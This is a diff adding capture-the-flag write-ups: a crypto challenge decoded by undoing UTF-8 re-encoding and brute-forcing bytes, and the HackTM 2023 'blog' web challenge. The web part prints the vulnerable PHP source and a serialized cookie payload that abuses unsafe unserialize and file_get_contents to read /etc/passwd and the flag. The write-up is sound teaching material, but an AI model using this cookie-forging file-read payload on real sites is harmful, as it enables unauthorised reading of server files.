@@ -100,6 +100,66 @@ hexdump of result:
 00000000  c3 93 c3 93 7e c3 94 c3 97 c2 a3 c3 b6 c2 ae c2  |Ã.Ã.~Ã.Ã.Â£Ã¶Â®Â|
 00000010  a3 c3 b6 c2 8f c2 bf c3 9a c3 9a c2 aa           |£Ã¶Â.Â¿Ã.Ã.Âª|
 ```
+The first unusual thing here is that the challenge use `'w'` to open the `result` file, but the characters written into it are ranging from `0x00-0xff`.
+
+What happens when a character over 127 is written in this case? By doing a simple experiment, we found that:
+```py
+with open('test','w') as f:
+  for i in range(256):
+    f.write(i+'\x00') # add '\0' as intervals
+```
+```
+00000000  00 00 01 00 02 00 03 00 04 00 05 00 06 00 07 00  |................|
+00000010  08 00 09 00 0a 00 0b 00 0c 00 0d 00 0e 00 0f 00  |................|
+00000020  10 00 11 00 12 00 13 00 14 00 15 00 16 00 17 00  |................|
+00000030  18 00 19 00 1a 00 1b 00 1c 00 1d 00 1e 00 1f 00  |................|
+00000040  20 00 21 00 22 00 23 00 24 00 25 00 26 00 27 00  | .!.".#.$.%.&.'.|
+00000050  28 00 29 00 2a 00 2b 00 2c 00 2d 00 2e 00 2f 00  |(.).*.+.,.-.../.|
+00000060  30 00 31 00 32 00 33 00 34 00 35 00 36 00 37 00  |0.1.2.3.4.5.6.7.|
+00000070  38 00 39 00 3a 00 3b 00 3c 00 3d 00 3e 00 3f 00  |8.9.:.;.<.=.>.?.|
+00000080  40 00 41 00 42 00 43 00 44 00 45 00 46 00 47 00  |@.A.B.C.D.E.F.G.|
+00000090  48 00 49 00 4a 00 4b 00 4c 00 4d 00 4e 00 4f 00  |H.I.J.K.L.M.N.O.|
+000000a0  50 00 51 00 52 00 53 00 54 00 55 00 56 00 57 00  |P.Q.R.S.T.U.V.W.|
+000000b0  58 00 59 00 5a 00 5b 00 5c 00 5d 00 5e 00 5f 00  |X.Y.Z.[.\.].^._.|
+000000c0  60 00 61 00 62 00 63 00 64 00 65 00 66 00 67 00  |`.a.b.c.d.e.f.g.|
+000000d0  68 00 69 00 6a 00 6b 00 6c 00 6d 00 6e 00 6f 00  |h.i.j.k.l.m.n.o.|
+000000e0  70 00 71 00 72 00 73 00 74 00 75 00 76 00 77 00  |p.q.r.s.t.u.v.w.|
+000000f0  78 00 79 00 7a 00 7b 00 7c 00 7d 00 7e 00 7f 00  |x.y.z.{.|.}.~...|
+00000100  c2 80 00 c2 81 00 c2 82 00 c2 83 00 c2 84 00 c2  |Â..Â..Â..Â..Â..Â|
+00000110  85 00 c2 86 00 c2 87 00 c2 88 00 c2 89 00 c2 8a  |..Â..Â..Â..Â..Â.|
+00000120  00 c2 8b 00 c2 8c 00 c2 8d 00 c2 8e 00 c2 8f 00  |.Â..Â..Â..Â..Â..|
+00000130  c2 90 00 c2 91 00 c2 92 00 c2 93 00 c2 94 00 c2  |Â..Â..Â..Â..Â..Â|
+00000140  95 00 c2 96 00 c2 97 00 c2 98 00 c2 99 00 c2 9a  |..Â..Â..Â..Â..Â.|
+00000150  00 c2 9b 00 c2 9c 00 c2 9d 00 c2 9e 00 c2 9f 00  |.Â..Â..Â..Â..Â..|
+00000160  c2 a0 00 c2 a1 00 c2 a2 00 c2 a3 00 c2 a4 00 c2  |Â .Â¡.Â¢.Â£.Â¤.Â|
+00000170  a5 00 c2 a6 00 c2 a7 00 c2 a8 00 c2 a9 00 c2 aa  |¥.Â¦.Â§.Â¨.Â©.Âª|
+00000180  00 c2 ab 00 c2 ac 00 c2 ad 00 c2 ae 00 c2 af 00  |.Â«.Â¬.Â..Â®.Â¯.|
+00000190  c2 b0 00 c2 b1 00 c2 b2 00 c2 b3 00 c2 b4 00 c2  |Â°.Â±.Â².Â³.Â´.Â|
+000001a0  b5 00 c2 b6 00 c2 b7 00 c2 b8 00 c2 b9 00 c2 ba  |µ.Â¶.Â·.Â¸.Â¹.Âº|
+000001b0  00 c2 bb 00 c2 bc 00 c2 bd 00 c2 be 00 c2 bf 00  |.Â».Â¼.Â½.Â¾.Â¿.|
+000001c0  c3 80 00 c3 81 00 c3 82 00 c3 83 00 c3 84 00 c3  |Ã..Ã..Ã..Ã..Ã..Ã|
+000001d0  85 00 c3 86 00 c3 87 00 c3 88 00 c3 89 00 c3 8a  |..Ã..Ã..Ã..Ã..Ã.|
+000001e0  00 c3 8b 00 c3 8c 00 c3 8d 00 c3 8e 00 c3 8f 00  |.Ã..Ã..Ã..Ã..Ã..|
+000001f0  c3 90 00 c3 91 00 c3 92 00 c3 93 00 c3 94 00 c3  |Ã..Ã..Ã..Ã..Ã..Ã|
+00000200  95 00 c3 96 00 c3 97 00 c3 98 00 c3 99 00 c3 9a  |..Ã..Ã..Ã..Ã..Ã.|
+00000210  00 c3 9b 00 c3 9c 00 c3 9d 00 c3 9e 00 c3 9f 00  |.Ã..Ã..Ã..Ã..Ã..|
+00000220  c3 a0 00 c3 a1 00 c3 a2 00 c3 a3 00 c3 a4 00 c3  |Ã .Ã¡.Ã¢.Ã£.Ã¤.Ã|
+00000230  a5 00 c3 a6 00 c3 a7 00 c3 a8 00 c3 a9 00 c3 aa  |¥.Ã¦.Ã§.Ã¨.Ã©.Ãª|
+00000240  00 c3 ab 00 c3 ac 00 c3 ad 00 c3 ae 00 c3 af 00  |.Ã«.Ã¬.Ã..Ã®.Ã¯.|
+00000250  c3 b0 00 c3 b1 00 c3 b2 00 c3 b3 00 c3 b4 00 c3  |Ã°.Ã±.Ã².Ã³.Ã´.Ã|
+00000260  b5 00 c3 b6 00 c3 b7 00 c3 b8 00 c3 b9 00 c3 ba  |µ.Ã¶.Ã·.Ã¸.Ã¹.Ãº|
+00000270  00 c3 bb 00 c3 bc 00 c3 bd 00 c3 be 00 c3 bf 00  |.Ã».Ã¼.Ã½.Ã¾.Ã¿.|
+```
+from `0x80-0xbf`, a `0xc2` will be added before the character itself;
+
+from `0xc0-0xff`, a `0xc3` will be added before the character, and the character will be minus by `0x40`.
+
+So we can reveal the original byte flow.
+
+Another vulnerability is that it is encrypting the flag byte by byte (which can be seem as `ECB` mode with `BLOCK_SIZE=1`), so the message space is quiet small (in fact, `0x20-0x7e`), and we can bruteforce them individually.
+
+(if you want to do it more elegant, you can also use `z3-solver` to deal with the equations)
+
 exp:
 ```py
 c = bytes.fromhex('C3 93 C3 93 7E C3 94 C3 97 C2 A3 C3 B6 C2 AE C2 A3 C3 B6 C2 8F C2 BF C3 9A C3 9A C2 AA')
@@ -901,3 +961,361 @@ else:
 ```
 Finally, remember to change the flag format to `0xL4ugh{}`.
 
+# HackTM CTF Quals 2023
+
+## blog (*solved after the game*)
+key codes:
+
+`index.php`:
+```php
+<?php
+include("util.php");
+if (!isset($_COOKIE["user"])) {
+    header("Location: /login.php");
+    die();
+} else {
+    $user = unserialize(base64_decode($_COOKIE["user"]));
+}
+?>
+```
+`util.php`:
+```php
+<?php
+class Post {
+    public $title;
+    public $content;
+    public $comments;
+
+    public function __construct($title, $content) {
+        $this->title = $title;
+        $this->content = $content;
+    }
+
+    public function __toString() {
+        $comments = $this->comments;
+        // comments are bugged for now, but in future it might be re-implemented
+        // when it is, just append $comments_fallback to $out
+        if ($comments !== null) {
+            $comments_fallback = $this->$comments;
+        }
+
+        $conn = new Conn;
+        $conn->queries = array(new Query(
+            "select id from posts where title = :title and content = :content",
+            array(":title" => $this->title, ":content" => $this->content)
+        ));
+        $result = $conn();
+        if ($result[0] === false) {
+            return "";
+        } else {
+            return "
+            <div class='card'> 
+                <h3 class='card-header'>{$this->title}</h3>
+                <div class='card-body'>
+                    <p class='card-text'>{$this->content}</p>
+                </div>
+                <div class='card-footer'>
+                    <input class='input-group-text' style='font-size: 12px;' disabled value='Commenting is disabled.' />
+                </div>
+            </div>
+            ";
+        }
+    }
+}
+
+class User {
+    public $profile;
+    public $posts = array();
+
+    public function __construct($username) {
+        $this->profile = new Profile($username);
+    }
+
+    // get user profile
+    public function get_profile() {
+        // some dev apparently mixed up user and profile... 
+        // so this check prevents any more errors
+        if ($this->profile instanceof User) {
+            return "@i_use_vscode please fix your code";
+        } else {
+            // quite unnecessary to assign to a variable imho
+            $profile_string = "
+            <div>{$this->profile}</div>
+            ";
+            return $profile_string;
+        }
+    }
+
+    public function get_posts() {
+        // check if we've already fetched posts before to save some overhead
+        // (our poor sqlite db is dying)
+        if (sizeof($this->posts) !== 0) {
+            return "Please reload the page to fetch your posts from the database";
+        }
+
+        // get all user posts
+        $conn = new Conn;
+        $conn->queries = array(new Query(
+            "select title, content from posts where user = :user",
+            array(":user" => $this->profile->username)
+        ));
+
+        // get posts from database
+        $result = $conn();
+        if ($result[0] !== false) {
+            while ($row = $result[0]->fetchArray(1)) {
+                $this->posts[] = new Post($row["title"], $row["content"]);
+            }
+        }
+
+        // build the return string
+        $out = "";
+        foreach ($this->posts as $post) {
+            $out .= $post;
+        }
+        return $out;
+    }
+
+    // who put this?? git blame moment (edit: i checked, it's @i_use_vscode as usual)
+    public function __toString() {
+        $profile = $this->profile;
+        return $profile();
+    }
+}
+
+class Profile {
+    public $username;
+    public $picture_path = "images/real_programmers.png";
+
+    public function __construct($username) {
+        $this->username = $username;
+    }
+
+    // hotfix for @i_use_vscode (see line 97)
+    // when removed, please remove this as well
+    public function __invoke() {
+        if (gettype($this->picture_path) !== "string") {        
+            return "<script>window.location = '/login.php'</script>";
+        }
+
+        $picture = base64_encode(file_get_contents($this->picture_path));
+
+        // check if user exists
+        $conn = new Conn;
+        $conn->queries = array(new Query(
+            "select id from users where username = :username",
+            array(":username" => $this->username)
+        ));
+        $result = $conn();
+        if ($result[0] === false || $result[0]->fetchArray() === false) {
+            return "<script>window.location = '/login.php'</script>";
+        } else {
+            return "
+            <div class='card'>
+                <img class='card-img-top profile-pic' src='data:image/png;base64,{$picture}'> 
+                <div class='card-body'>
+                    <h3 class='card-title'>{$this->username}</h3>
+                </div>
+            </div>
+            ";
+        }
+    }
+
+    // this is the correct implementation :facepalm:
+    public function __toString() {
+        if (gettype($this->picture_path) !== "string") {        
+            return "";
+        }
+
+        $picture = base64_encode(file_get_contents($this->picture_path));
+
+        // check if user exists
+        $conn = new Conn;
+        $conn->queries = array(new Query(
+            "select id from users where username = :username",
+            array(":username" => $this->username)
+        ));
+        $result = $conn();
+        if ($result[0] === false || $result[0]->fetchArray() === false) {
+            return "<script>window.location = '/login.php'</script>";
+        } else {
+            return "
+            <div class='card'>
+                <img class='card-img-top profile-pic' src='data:image/png;base64,{$picture}'> 
+                <div class='card-body'>
+                    <h3 class='card-title'>{$this->username}</h3>
+                </div>
+            </div>
+            ";
+        }
+    }
+}
+
+class Conn {
+    public $queries;
+
+    // old legacy code - idk what it does but not touching it...
+    public function __invoke() {
+        $conn = new SQLite3("/sqlite3/db");
+        $result = array();
+
+        // on second thought, whoever wrote this is a genius
+        // its gotta be @i_use_neovim
+        foreach ($this->queries as $query) {
+            if (gettype($query->query_string) !== "string") {
+                return "Invalid query.";
+            }
+            $stmt = $conn->prepare($query->query_string);
+            foreach ($query->args as $param => $value) {
+                if (gettype($value) === "string" || gettype($value) === "integer") {
+                    $stmt->bindValue($param, $value);
+                } else {
+                    $stmt->bindValue($param, "");
+                }
+            }
+            $result[] = $stmt->execute();
+        }
+
+        return $result;
+    }
+}
+
+class Query {
+    public $query_string = "";
+    public $args;
+
+    public function __construct($query_string, $args) {
+        $this->query_string = $query_string;
+        $this->args = $args;
+    }
+
+    // for debugging purposes
+    public function __toString() {
+        return $this->query_string;
+    }
+}
+?>
+```
+`login.php`:
+```php
+<?php
+include("util.php");
+if ($_SERVER["REQUEST_METHOD"] === "POST") {
+    $username = $_POST["username"];
+    $password = $_POST["password"];
+    $conn = new Conn;
+    $conn->queries = array(new Query(
+        "select username from users where username = :username and password = :password",
+        array(":username" => $username, ":password" => $password)
+    ));
+    $result = $conn();
+    if ($result[0] !== false && $result[0]->fetchArray()) {
+        $user = new User($username);
+        setcookie("user", base64_encode(serialize($user)));
+        echo "
+        <script>
+            window.location = '/index.php'
+        </script>";
+    }
+}
+?>
+```
+From the code we know the cookie was created by `base64_encode(serialize($user))`, so we can forge arbitrary identity by tampering with the cookie.
+
+At first, I change to the admin's account, only to see many first comers showing the xss on admin's blog.
+
+In fact, there's another significant place to exploit: the profile picture.
+```php
+$picture = base64_encode(file_get_contents($this->picture_path));
+```
+By using the `file_get_contents()` function, we can read any file on the server (within the user-level permission).
+
+Like `/etc/passwd`:
+```
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+```
+`/etc/group`:
+```
+root:x:0:
+daemon:x:1:
+bin:x:2:
+sys:x:3:
+adm:x:4:
+tty:x:5:
+disk:x:6:
+lp:x:7:
+mail:x:8:
+news:x:9:
+uucp:x:10:
+man:x:12:
+proxy:x:13:
+kmem:x:15:
+dialout:x:20:
+fax:x:21:
+voice:x:22:
+cdrom:x:24:
+floppy:x:25:
+tape:x:26:
+sudo:x:27:
+audio:x:29:
+dip:x:30:
+www-data:x:33:
+backup:x:34:
+operator:x:37:
+list:x:38:
+irc:x:39:
+src:x:40:
+gnats:x:41:
+shadow:x:42:
+utmp:x:43:
+video:x:44:
+sasl:x:45:
+plugdev:x:46:
+staff:x:50:
+games:x:60:
+users:x:100:
+nogroup:x:65534:
+```
+but wait, where's the flag? The flag is our final target.
+
+I tried `/flag`, `./flag`, `/flag.txt`, `./flag.txt`, `/home/{username}/flag.txt` and etc., but none of them work.
+
+It was not **until the game ended** that I realized there was even a `Dockerfile`... (outside the `chal/` folder)
+```
+FROM php:8.0-apache
+
+COPY ./chal/html /var/www/html
+COPY ./chal/db /sqlite3/db
+COPY ./chal/flag.txt /02d92f5f-a58c-42b1-98c7-746bbda7abe9/flag.txt
+RUN chmod -R 777 /sqlite3/
+RUN chmod -R 777 /var/www/html/
+```
+The path is given in the dockerfile! So the problem was solved:
+```php
+O:4:"User":2:{s:7:"profile";O:7:"Profile":2:{s:8:"username";s:10:"aaa34rterf";s:12:"picture_path";s:46:"/02d92f5f-a58c-42b1-98c7-746bbda7abe9/flag.txt";}s:5:"posts";a:0:{}}
+```
+```html
+<img class="card-img-top profile-pic" src="data:image/png;base64,SGFja1RNe3IzdF9fdG9TdHJpbmdfMXNfczBfZnVuXzEzYzU3M2Y2fQo=">
+```
+```
+HackTM{r3t__toString_1s_s0_fun_13c573f6}
+```
+What a pity! Remember to check every file given by the challenge carefully next time!
